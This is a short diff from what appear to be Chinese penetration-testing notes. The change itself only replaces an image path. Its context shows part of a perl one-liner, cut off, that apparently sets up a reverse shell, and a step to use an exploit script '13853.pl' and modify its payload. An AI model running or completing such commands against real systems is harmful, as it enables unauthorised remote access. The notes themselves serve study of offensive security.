@@ -57,4 +57,4 @@ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*
 
 使用`13853.pl`，修改payload
 
-![image-20220905230853007](../../.gitbook/assets/image-20220905230853007.png)
+![image-20230208160725302](../../.gitbook/assets/image-20230208160725302.png)
